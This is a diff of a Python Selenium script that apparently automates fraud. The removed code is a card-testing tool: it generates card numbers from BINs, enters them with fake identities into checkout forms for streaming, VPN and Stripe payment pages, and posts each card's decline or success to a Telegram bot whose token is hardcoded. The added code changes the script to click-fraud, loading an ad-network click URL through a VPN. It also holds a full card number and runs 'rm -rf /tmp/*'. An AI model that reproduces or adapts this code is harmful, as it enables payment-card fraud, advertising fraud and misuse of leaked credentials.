@@ -1,5 +1,5 @@
 import cnf_bvb
-import mod_vpn
+import mod_vpn2
 import mod_driver
 import emoji
 from pyvirtualdisplay import Display
@@ -14,15 +14,14 @@ from selenium.webdriver.support import expected_conditions as EC
 import random,datetime,string , os ,time ,subprocess , sys , requests ,re
 from selenium.webdriver import ActionChains
 import json
-import pickle
-import bin00
-import t00l_
+# import pickle
+
 
 ###########global urls_BVB
 # urls_BVB=cnf_bvb.random_url
 #####################################
 # urls_BVB="https://wild-beauty.weebly.com/about.html"
-urls_BVB="https://pedantic-wescoff-chat-covid19.netlify.app/index.html"
+urls_BVB="https://bitcoin-chat-news-and-games.netlify.app/"
 # random_display_chose=cnf_bvb.random_display_chose
 # width=cnf_bvb.width
 # height=cnf_bvb.height
@@ -33,13 +32,6 @@ sys_use_agent=re.findall('\(.*?\)',user_agent)[0]
 
 ########################################################################################################################################
 
-def send_msg(text):
-   token = "2137513961:AAGENlwIUQnfvbKZX64-fZ72R_oStto8oFo"
-   chat_id = "-643828126"
-   url_req = "https://api.telegram.org/bot" + token + "/sendMessage" + "?chat_id=" + chat_id + "&text=" + text 
-   results = requests.get(url_req)
-   print(results.json())
-
 
 
 
@@ -49,93 +41,11 @@ def clean_up():
 	os.system("rm -rf rm -rf __pycache__/")
 
 
-def check_the_message(msg_replay,driver):
-	if "Your card number is incorrect" in msg_replay:
-		print("Your card number is incorrect : (")
-		go_billing(driver)
-	
-
-
-	if "success" in msg_replay:
-		print("successful : )"+msg_replay)
-		input('successful ')
-
-	#Your card was declined
-	if "Your card was declined" in msg_replay:
-		print(msg_replay)
-		go_billing(driver)
 
 
 
 
 
-
-def card_fonction(driver):
-
-	print("CARD INFOS  ...... ",end='',flush=True)
-
-	try:
-
-		NAME_BUTTON=WebDriverWait(driver, 25).until(EC.presence_of_element_located((By.ID, 'name')))
-		NAME_BUTTON.send_keys("Jhon whik")
-		# input("lets play")
-		time.sleep(1)
-		CARD_NUMBER_BUTTON=WebDriverWait(driver, 25).until(EC.presence_of_element_located((By.ID, 'number')))
-		CARD_NUMBER_BUTTON.send_keys("4137602328178547")#4016580721408602 4137602328178547
-		# input("lets play")
-		time.sleep(1)
-		EXP_BUTTON=WebDriverWait(driver, 25).until(EC.presence_of_element_located((By.ID, 'exp_date')))
-		EXP_BUTTON.send_keys("05/22")
-		time.sleep(1)
-		CCV_BUTTON=WebDriverWait(driver, 25).until(EC.presence_of_element_located((By.ID, 'cvc')))
-		CCV_BUTTON.send_keys("052",Keys.ENTER)
-		# CCV_BUTTON.send_keys("052")
-		time.sleep(3)
-
-		# input("lets play")
-		try:
-
-			SUCCESS_MSG_BUTTON=WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.ID, 'stripe-success')))
-			
-			msg_replay=SUCCESS_MSG_BUTTON.text
-			# print(msg_replay)
-		except Exception as e:
-			pass
-
-		# input("SUCCESS_MSG_BUTTON")
-
-
-		try:
-			ERROR_MSG_BUTTON=WebDriverWait(driver, 15).until(EC.presence_of_element_located((By.ID, 'stripe-error')))
-			time.sleep(5)
-			msg_replay=ERROR_MSG_BUTTON.text
-			# print(msg_replay)
-		except Exception as e:
-			pass
-
-		check_the_message(msg_replay,driver)
-
-
-	except Exception as e:
-		print(e)
-
-def end_success(driver):
-
-	try:
-		print("Close Firefox ...... ",end='')
-		driver.quit()
-
-		print(emoji.emojize("Ok "' :check_mark_button: :alien:'))
-		time.sleep(1)
-	except:
-		pass
-	try:
-		print("Close Display ...... ",end='')
-		display.stop()
-		print(emoji.emojize("Ok "' :check_mark_button: :alien:'))
-	except:
-		pass
-	init_fire()
 	#starting_tasks()
 ############################################################################################
 
@@ -143,395 +53,6 @@ def end_success(driver):
 
 
 
-
-
-
-
-
-def fill_form_one(driver,url_get_text):
-
-
-	usr_ar=user_information()
-	# print(usr_ar)
-	caed_ar=bin_operation()
-
-	print(url_get_text)
-	# input("")
-	EMAIL_CASE=WebDriverWait(driver, 25).until(EC.presence_of_element_located((By.XPATH, '//*[@id="app"]/div/div[2]/div[2]/div/div[2]/div[1]/form/div[1]/div[1]/div[2]/input')))
-	emm=usr_ar[7]
-	# print(emm)
-	
-	EMAIL_CASE.send_keys(Keys.CONTROL+'a' )
-	EMAIL_CASE.send_keys(Keys.BACKSPACE )
-	EMAIL_CASE.send_keys(emm)
-	# print("change email")
-
-# 	
-# c5gha.btcy@adhoc-orange.com
-	#form__input -feedback -error -m-half   #/html/body/div[1]/div[2]/div[2]/div[2]/div/div[2]/div[1]/form/div[1]/div[2]/input
-	# input("password")
-	# time.sleep(3)
-	PASSWORD_CASE=WebDriverWait(driver, 25).until(EC.presence_of_element_located((By.XPATH, '//*[@id="app"]/div[2]/div[2]/div[2]/div/div[2]/div[1]/form/div[1]/div[2]/input')))
-	PASSWORD_CASE.send_keys(usr_ar[0])
-	# time.sleep(1)
-	PASSWORD_CASE.send_keys(Keys.TAB,usr_ar[1])
-	# time.sleep(1)
-	PASSWORD_CASE.send_keys(Keys.TAB*2,usr_ar[2])
-	# time.sleep(1)
-	PASSWORD_CASE.send_keys(Keys.TAB*4,Keys.SPACE)
-	# time.sleep(1)
-	PASSWORD_CASE.send_keys(Keys.TAB*5,usr_ar[3])
-	# time.sleep(1)
-	PASSWORD_CASE.send_keys(Keys.TAB*6,usr_ar[4])
-	# time.sleep(1)
-	PASSWORD_CASE.send_keys(Keys.TAB*7,usr_ar[5])
-	# time.sleep(1)
-	PASSWORD_CASE.send_keys(Keys.TAB*8,usr_ar[6])
-	# time.sleep(1)
-	PASSWORD_CASE.send_keys(Keys.TAB*9,Keys.SPACE)
-	len_ifram=driver.find_elements_by_tag_name("iframe")
-	# print(str(len(len_ifram)))
-	time.sleep(1)
-	driver.switch_to.frame(driver.find_elements_by_tag_name("iframe")[0])
-	time.sleep(1)
-	CARD_RD_CASE=WebDriverWait(driver, 8).until(EC.presence_of_element_located((By.XPATH, '//*[@id="encryptedCardNumber"]')))
-	CARD_RD_CASE.send_keys(caed_ar[0])
-	time.sleep(1)
-	# CARD_RD_CASE.send_keys(Keys.TAB, caed_ar[1])
-	# time.sleep(3)
-	# CARD_RD_CASE.send_keys(Keys.TAB*2, caed_ar[2])
-
-	print("number card")
-	driver.switch_to.default_content()
-	time.sleep(1)
-	# input("5")
-	#//*[@id="encryptedExpiryDate"]
-	driver.switch_to.frame(driver.find_elements_by_tag_name("iframe")[1])
-	time.sleep(1)
-	CARD_EXP_DATE_CASE=WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="encryptedExpiryDate"]')))
-
-	time.sleep(1)
-	CARD_EXP_DATE_CASE.send_keys(caed_ar[1])
-	time.sleep(1)
-	# CARD_EXP_DATE_CASE.send_keys(Keys.TAB*2, caed_ar[2])
-	driver.switch_to.default_content()
-	print("CARD_EXP_DATE_CASE")
-	# input("5")
-	time.sleep(1)
-	driver.switch_to.frame(driver.find_elements_by_tag_name("iframe")[2])
-	time.sleep(1)
-	CARD_CVV_CASE=WebDriverWait(driver, 8).until(EC.presence_of_element_located((By.XPATH, '//*[@id="encryptedSecurityCode"]')))
-	CARD_CVV_CASE.click()
-	# time.sleep(2)
-	CARD_CVV_CASE.send_keys(caed_ar[2])
-	time.sleep(1)
-	driver.switch_to.default_content()
-	time.sleep(1)
-	# CARD_RD_CASE.send_keys(Keys.ENTER)
-	#button -blue -form -full
-	START_BUTTON=WebDriverWait(driver, 11).until(EC.presence_of_element_located((By.XPATH, '//*[@id="app"]/div[2]/div[2]/div[2]/div/div[2]/div[1]/form/button')))
-	START_BUTTON.click()
-	time.sleep(7)
-
-
-	#
-	print(caed_ar)
-	check_general_form_one(driver,caed_ar)
-	# check_general_form2(driver,caed_ar)
-
-	# input("4")
-
-
-
-#############################--------------------------------------------------------------------------
-
-def fill_form_tow(driver,url_get_text):
-
-	print("fill_form_tow ...... ",end='',flush=True)
-	caed_ar=bin_operation()
-	# input("5")
-	time.sleep(1)
-	#//*[@id="encryptedExpiryDate"]
-	driver.switch_to.frame(driver.find_elements_by_tag_name("iframe")[0])
-	time.sleep(1)
-	CARD_RD_CASE=WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="encryptedCardNumber"]')))
-	CARD_RD_CASE.click()
-	CARD_RD_CASE.send_keys(caed_ar[0])
-	# CARD_RD_CASE.send_keys(Keys.TAB*2,caed_ar[1])
-	# CARD_RD_CASE.send_keys(Keys.TAB*2,caed_ar[2])
-	# #
-	print("number card")
-	driver.switch_to.default_content()
-	time.sleep(1)
-	# input("5")
-	#//*[@id="encryptedExpiryDate"]
-	driver.switch_to.frame(driver.find_elements_by_tag_name("iframe")[1])
-	time.sleep(1)
-	CARD_EXP_DATE_CASE=WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="encryptedExpiryDate"]')))
-
-	time.sleep(1)
-	CARD_EXP_DATE_CASE.click()
-	CARD_EXP_DATE_CASE.send_keys(Keys.CONTROL+'a' )
-	CARD_EXP_DATE_CASE.send_keys(Keys.BACKSPACE )
-	CARD_EXP_DATE_CASE.send_keys(caed_ar[1])
-	time.sleep(1)
-	# CARD_EXP_DATE_CASE.send_keys(Keys.TAB*2, caed_ar[2])
-	driver.switch_to.default_content()
-	print("CARD_EXP_DATE_CASE")
-	# input("5")
-	time.sleep(1)
-	driver.switch_to.frame(driver.find_elements_by_tag_name("iframe")[2])
-	time.sleep(1)
-	CARD_CVV_CASE=WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="encryptedSecurityCode"]')))
-	CARD_CVV_CASE.click()
-	# time.sleep(2)
-	CARD_CVV_CASE.send_keys(caed_ar[2])
-	driver.switch_to.default_content()
-	time.sleep(1)
-	#
-	CONTINUE_BUTTON=WebDriverWait(driver,10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="app"]/div/div[2]/div[2]/div/div[2]/div[1]/form/div[2]/button')))
-	CONTINUE_BUTTON.click()
-	time.sleep(6)
-	check_general_form2(driver,caed_ar)
-
-	# input("date expiration")
-
-def check_general_form_one(driver,caed_ar):
-	card_number=caed_ar[0]
-	extract_bin=" [ "+card_number[0:8]+" ] "
-	try:
-		
-		print("CHECK THE PAGE F1 ...... ",end='',flush=True)
-		URL_BUTTON=WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="app"]/div[2]/div[2]/div[2]/div/div[2]/div[1]/p')))
-		url_get_text=URL_BUTTON.text
-		# print(url_get_text)
-		
-		# input('')
-		if "Please use a different card," in url_get_text:
-			add_to_last_bin()
-			telegram_msg="DECLINE :interrobang: "+extract_bin+card_number
-			send_msg(telegram_msg)
-			fill_form_tow(driver,url_get_text)
-
-		#form__input -feedback -error -m-half
-		if "try again" in url_get_text:
-			add_to_last_bin()
-			telegram_msg="DECLINE :interrobang: "+extract_bin+card_number
-			send_msg(telegram_msg)
-			fill_form_tow(driver,url_get_text)
-
-	except Exception as e:
-		print(e)
-	try:
-		print("CHECK THE PAGE 3 F1 ...... ",end='',flush=True)
-		URL_BUTTON=WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="app"]/div[2]/div[2]/div[2]/div/div[2]/div[1]/p')))
-		url_get_text=URL_BUTTON.text
-
-		if "chosen your Stan plan" in url_get_text:
-			telegram_msg="SUCCESS :white_check_mark "+extract_bin+card_number
-			add_to_last_bin()
-			# msg_text="SUCCESS :white_check_mark ["+caed_ar[0]+" ]"
-			save_successed_bin(caed_ar[0])
-			send_msg(telegram_msg)
-			end_success(driver)
-			# fill_form_tow(driver,url_get_text)
-
-		if "try again." in url_get_text:
-			# msg_text="INCORECT :interrobang:  :interrobang   ["+caed_ar[0]+" ]"
-			telegram_msg="INCORECT :interrobang:  "+extract_bin+card_number
-			add_to_last_bin()
-			send_msg(telegram_msg)
-
-			fill_form_tow(driver,url_get_text)		
-		#form__input -feedback -error -m-half
-	except Exception as e:
-		print(e)
-
-
-
-#form__input -feedback -error -m-half 52298708 52297399
-#----------------------------------------------------------------------------------------------------
-
-def check_general_form2(driver,caed_ar):
-
-	card_number=caed_ar[0]
-	extract_bin=" [ "+card_number[0:8]+" ] "
-
-
-	try:
-		print("CHECK THE PAGE 2 F2 ...... ",end='',flush=True)
-		URL_BUTTON=WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="app"]/div[2]/div[2]/div[2]/div/div[2]/div[1]/p')))
-		url_get_text=URL_BUTTON.text
-		if "Please use a different card," in url_get_text:
-			telegram_msg="DECLINE :interrobang: "+extract_bin+card_number
-			add_to_last_bin()
-			send_msg(telegram_msg)
-			fill_form_tow(driver,url_get_text)
-
-		if "try again" in url_get_text:
-			telegram_msg="INCORECT :interrobang:  "+extract_bin+card_number
-			add_to_last_bin()
-			send_msg(telegram_msg)
-
-			fill_form_tow(driver,url_get_text)		
-	except Exception as e:
-		print(e)
-
-
-	try:
-		print("CHECK THE PAGE 3 F2 ...... ",end='',flush=True)
-		URL_BUTTON=WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="app"]/div[2]/div[2]/div[2]/div/div[2]/div[1]/p')))
-		url_get_text=URL_BUTTON.text
-		if "chosen your Stan plan" in url_get_text:
-			telegram_msg="SUCCESS :white_check_mark "+extract_bin+card_number
-			add_to_last_bin()
-			send_msg(telegram_msg)
-			end_success(driver)
-
-		if "try again" in url_get_text:
-			telegram_msg="INCORECT   :interrobang:  "+extract_bin+card_number
-			add_to_last_bin()
-			send_msg(telegram_msg)
-
-			fill_form_tow(driver,url_get_text)		
-	except Exception as e:
-		print(e)
-
-
-
-
-def check_general(driver):
-	# caed_ar=[]
-
-
-	try:	
-		print("CHECK THE PAGE G...... ",end='',flush=True)
-		URL_BUTTON=WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR, '.modal__title')))
-		url_get_text=URL_BUTTON.text
-		# print(url_get_text)
-		if "30 day free trial" in url_get_text:
-			fill_form_one(driver,url_get_text)
-		#form__input -feedback -error -m-half
-	except Exception as e:
-		print(e)
-
-	
-
-
-
-
-
-def fill_vpn_form(driver):
-	print(".................... FILL FORM - 1 - .................... \n")
-	print("GENERATE USER  INFO         : ",end='',flush=True)
-	usr_ar=user_information()
-	# print("ok")
-	print(usr_ar)
-	# print("GENERATE CARD INFO ...... ",end='',flush=True)
-	caed_ar=bin_operation()
-	s_date_card=caed_ar[1].split("/")
-	card_month=s_date_card[0]
-	if card_month[0]=="0":
-		card_month=card_month[1]
-	m_clicks=int(card_month)
-	card_years=s_date_card[1]
-	y_clicks=int(card_years)-20
-
-	# print("ok")
-
-	try:
-		#signup_email
-		EMAIL_CASE=WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'signup_email')))
-		EMAIL_CASE.send_keys(usr_ar[0])
-
-
-	except Exception as e:
-		print(e)
-
-			
-	try:
-		#creditcard
-		OPEN_DIV=WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="accordion"]/div[1]/div[1]/a/h4')))
-		# OPEN_DIV.send_keys(Keys.SPACE)
-		OPEN_DIV.click()
-		time.sleep(2)
-	except Exception as e:
-		print(e)
-	#creditcard
-
-			
-	try:
-		#signup_first_name
-		FIRST_NAME_CASE=WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'signup_first_name')))
-		# OPEN_DIV.send_keys(Keys.SPACE)
-		FIRST_NAME_CASE.click()
-		FIRST_NAME_CASE.send_keys(usr_ar[1],Keys.TAB,usr_ar[2],Keys.TAB ,caed_ar[0],Keys.TAB ,Keys.ARROW_DOWN*m_clicks,Keys.TAB ,Keys.ARROW_DOWN*y_clicks)
-	except Exception as e:
-		print(e)
-	#creditcard
-	input('VIST ORDER EXPRESS VPN !!!!')
-
-
-
-def nord_vpn_form_email(driver):
-	usr_ar=user_information()
-	caed_ar=bin_operation()
-	print(caed_ar,usr_ar)
-
-
-	try:
-		
-		CONTINUE_BUTTON=WebDriverWait(driver, 25).until(EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div/main/div/div[2]/div/div/div/a[2]')))
-		# input('VIST ORDER EXPRESS VPN !!!!')
-		CONTINUE_BUTTON.click()
-		CONTINUE_BUTTON.send_keys(Keys.TAB,usr_ar[0])
-		#scroller_processout
-		# input('VIST ORDER EXPRESS VPN !!!!')
-		FIRST_NAME_CASE=WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//*[text()="Credit or debit card"]')))
-		# FIRST_NAME_CASE.send_keys(Keys.SPACE)
-		# time.sleep(2)
-		FIRST_NAME_CASE.click()
-		time.sleep(5)
-		# input('VIST ORDER EXPRESS VPN 5 !!!!')
-		FIRST_NAME_CASE.send_keys(Keys.TAB,usr_ar[1],Keys.TAB,usr_ar[2])
-		time.sleep(5)
-		len_ifram=driver.find_elements_by_tag_name("iframe")
-		# print(str(len(len_ifram)))
-		time.sleep(2)
-		driver.switch_to.frame(driver.find_elements_by_tag_name("iframe")[0])
-		time.sleep(2)
-		CARD_RD_CASE=WebDriverWait(driver, 18).until(EC.presence_of_element_located((By.XPATH, '//*[@id="processout-field"]')))
-		CARD_RD_CASE.send_keys(caed_ar[0],Keys.TAB*2,caed_ar[1].replace("/",""),Keys.TAB*2,caed_ar[2],Keys.TAB,usr_ar[3],Keys.ENTER)
-		time.sleep(1)
-		driver.switch_to.default_content()
-		time.sleep(1)
-		FIRST_NAME_CASE=WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//*[text()="Continue"]')))
-		# FIRST_NAME_CASE.send_keys(Keys.SPACE)
-		time.sleep(2)
-		FIRST_NAME_CASE.click()
-		FIRST_NAME_CASE.click()
-		#
-		CONTINUE_BUTTON=WebDriverWait(driver, 35).until(EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div/main/div/div[1]/div/div/div/div/div/div/div')))
-		telegram_msg=CONTINUE_BUTTON.text
-		print(telegram_msg)
-		add_to_last_bin()
-		# msg_text="SUCCESS :white_check_mark ["+caed_ar[0]+" ]"
-		# save_successed_bin(caed_ar[0])
-		send_msg(telegram_msg)
-		end_success(driver)
-		# add_to_last_bin()
-
-
-		# FIRST_NAME_CASE.send_keys(Keys.TAB*5,caed_ar[0],Keys.TAB,caed_ar[1],Keys.TAB,caed_ar[2])
-
-		# input('VIST ORDER EXPRESS VPN !!!!')
-	except Exception as e:
-		im_g="chk/"+usr_ar[0]+caed_ar[0]+".png"
-		driver.switch_to.default_content()
-		time.sleep(1)
-	#
-		driver.save_screenshot(im_g)
-		print(e)
 
 
 
@@ -558,52 +79,7 @@ def lets_play(serv,ops):
 		driver.set_page_load_timeout(79)
 
 		print(emoji.emojize("Ok "' :check_mark_button: :alien:'))
-		ads_class(driver)
-		driver.get(main_url)
-		# user_email="c5ghabtc0y+253@adhoc-orange.com"
-
-
-		ONE_MONTH_BUTTON=WebDriverWait(driver, 25).until(EC.presence_of_element_located((By.XPATH, '//*[@id="__next"]/div/main/div/div[2]/div[1]/a/img')))
-		ONE_MONTH_BUTTON.click()
-		# input('VIST ORDER EXPRESS VPN1 !!!!') 	
-		time.sleep(8)
-
-		CONTINUE_BUTTON=WebDriverWait(driver, 25).until(EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div/main/div/div[2]/div/div/div/a[1]')))
-		# input('VIST ORDER EXPRESS VPN !!!!')
-		CONTINUE_BUTTON.click()
-		# input('VIST ORDER EXPRESS VPN 3!!!!') 
-		time.sleep(2)
-		#
-
-		CONTINUE_BUTTON.send_keys(Keys.TAB*5,Keys.ENTER,Keys.TAB*2,Keys.ENTER)
-		print("SELECTED ONE MONTH OK !!!!")
-		CONTINUE_BUTTON=WebDriverWait(driver, 25).until(EC.presence_of_element_located((By.XPATH, '//*[@id="__next"]/div/div/div/div/div/div/a')))
-		# input('VIST ORDER EXPRESS VPN !!!!')
-		CONTINUE_BUTTON.click()
-		# input('VIST ORDER EXPRESS VPN !!!!')
-		time.sleep(2)
-
-#
-		CONTINUE_BUTTON=WebDriverWait(driver, 25).until(EC.presence_of_element_located((By.XPATH, '/html/body/div[6]/div/div/div/div/div/div[4]/a[1]')))
-		# input('VIST ORDER EXPRESS VPN !!!!')
-		CONTINUE_BUTTON.click()
-		time.sleep(3)
-		# input('VIST ORDER EXPRESS VPN !!!!')
-		# # EMAIL_BUTTON.send_keys(user_email)//*[@id="input-label-7FCEFAF6-0404-4B3B-F3A8-8C97AFF97E12"]
-		# SignupForm
-		# # EMAIL_BUTTON.send_keys(Keys.TAB,Keys.ENTER)
-
-
-		# time.sleep(5)
-		# CONTINUE_BUTTON.send_keys(Keys.ENTER)
-		# print("Dashboard on home")
-		# # caed_ar=[]
-		# check_general(driver)
-		# #modal__title
-		# # input("web ok")
-		nord_vpn_form_email(driver)
-
-		# go_billing(driver)
+		ads_class(driver)	
 	except Exception as error:
 		print(str(error))
 
@@ -670,14 +146,18 @@ def stage_1():
 #################################"MAIN STARTING"##############################
 def ads_class(driver):
 	try:
-		driver.get("https://bitcoin-chat-news-and-games.netlify.app/")
-		time.sleep(20)
+		driver.get(urls_BVB)
+		time.sleep(10)
+		driver.get("https://click.a-ads.com/1847449/148128/")
+		time.sleep(5)
+
+		# driver.get(urls_BVB)
+		# time.sleep(10)
 		driver.execute_script("window.open('');")
 		time.sleep(1)
 		driver.switch_to.window(driver.window_handles[1])
 		time.sleep(1)
-		# driver.get("https://serene-keller-a6f116.netlify.app/index.html")
-		# time.sleep(20)
+		input('zzzz')
 	except Exception as e:
 		print(e)
 		
@@ -692,12 +172,9 @@ def starting_tasks():
 	try:
 		stage_1()### CLEAR
 		# os.system("curl -sx socks5://127.0.0.1:9050 ifconfig.co | grep -oP '(?<=Your IP</span>: ).*(?=</span>)'")
-		mod_vpn.fnc_vpn ()
+		mod_vpn2.fnc_vpn ()
 		# mod_vpn.renew_connection()
 		serv,ops=mod_driver.build_driver(width ,height)
-		
-		# os.system("curl -sx socks5://127.0.0.1:9050 ifconfig.co | grep -oP '(?<=Your IP</span>: ).*(?=</span>)'")
-		#build_driver()###### BUILDING DRIVER
 		lets_play(serv,ops)
 		clean_up()
 
@@ -811,17 +288,16 @@ def save_successed_bin(card_numer):
 os.system("rm -rf /tmp/*")
 
 
-# starting_tasks()
-# clean_up()
-def begaining_loop():
-	for i in range(1000):
-		bin_operation()
-		user_information()
-		add_to_last_bin()
 
 
 
+def main():
+	starting_tasks()
+
+
+if __name__ == '__main__':
+
+	main()
 
 
 # begaining_loop()
-starting_tasks()
